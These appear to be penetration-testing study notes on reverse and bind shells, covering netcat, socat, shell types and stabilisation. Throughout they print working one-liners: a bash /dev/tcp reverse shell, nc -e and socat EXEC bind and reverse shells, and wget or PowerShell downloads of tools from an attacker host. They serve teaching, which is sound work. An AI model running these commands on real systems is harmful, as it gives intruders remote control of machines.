# Shells
Shells are the `programs running inside the console that interpret your commands` ran on your CLI (Command-line interface). In other words, the common `bash` or `sh` programs in Linux are examples of shells, as are `cmd.exe` and `Powershell` on Windows.

When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

Most used shells: `bash`, `sh`, `cmd.exe`, `powershell.exe` & `/bin/zsh`

## Tools
1. Netcat: A networking tool commonly used for setting up listeners and reverse shells.

    Example: `nc -lvnp <PORT>` where l=listen, v=verbose, n=no reverse-DNS & p=port specification.

2. Socat: An advanced alternative to Netcat, supports encrypted connections and more protocols. Encrypted Socat shells are also possible using `OPENSSL`.

    `socat TCP-L:<PORT> -` + `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` or `EXEC:powershell.exe,pipes`

3. Metasploit multi/handler
4. Msfvenom

Another useful set of tools:
1. `rlwrap`, a tool to wrap readline functionality for command-line utilities that lack it (e.g., netcat).
2. Python: Converting a simple shell into a fully interactive shell. `python3 -c 'import pty; pty.spawn("/bin/bash")'`

## Types:
1. Reverse shell: We force a remote server to give us CLI access.

    Example : `rlwrap nc -lvnp 4444` (listener), `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` 

2. Bind shell: We open a port on a remote server which we can connect to in order to execute commands.

    Example: `nc -lvnp <port> -e "cmd.exe"` (target machine), `nc MACHINE_IP <port>` (attacking machine).

### Interactive vs. Non-interactive shells
1. Interactive: These allow you to interact with programs after executing them.

    Example: `Powershell, Bash, Zsh, sh` or any other standard CLI environment

2. Non-Interactive: You are limited to using programs which `do not require user interaction` in order to run properly.

    Example: Can't run `ssh` but can run `whoami`, `pwd`, etc.

Where to find shells:
1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
2. [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
3. [Revshells](https://www.revshells.com/)

## Other common shell commands
| Command | Purpose |
|-|-|
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to a fully interactive shell. |
| `export TERM=xterm` | Fix terminal display issues in a simple shell. |
| `CTRL + Z` | Background the current shell process. |
| `stty raw -echo` and `fg` | Fix line formatting issues when bringing a shell to the foreground. |
| `rlwrap nc -lvnp <PORT>` | Use `rlwrap` for history and arrow key navigation in Netcat shells. |
| `socat tcp-listen:<PORT>,reuseaddr,fork exec:/bin/bash` | Start an advanced reverse shell listener. |
| `php -r '...'` | Execute a PHP reverse shell payload. |

## Shell stabilisation
Shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors.

Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder.

### Technique 1: Python
Mostly used on Linux systems.

1. Spawn a python shell using `python -c 'import pty;pty.spawn("/bin/bash")'`.
2. Get access to term commands such as `clear` using `export TERM=xterm`.
3. Background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). `To fix this, type reset and press enter`.

### Technique 2: rlwrap
Similar to `stty`, rlwrap gives us access to history, tab autocompletion and arrow keys.  however, some manual stabilisation must still be utilised if you want to be able to use `Ctrl + C` inside the shell.

1. Invoke a slightly different listener: `rlwrap nc -lvnp <port>`.
2. Background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

### Technique 3: Socat
Typically to Linux systems.

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell.

1.  Transfer a [Socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

    A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file.
    
    Or using Powershell: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

    On Linux this would be accomplished with `curl` or `wget` (`wget <LOCAL-IP>/socat -O /tmp/socat`).

### Change your terminal tty size
With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

Example: `stty rows <number>` & `stty cols <number>`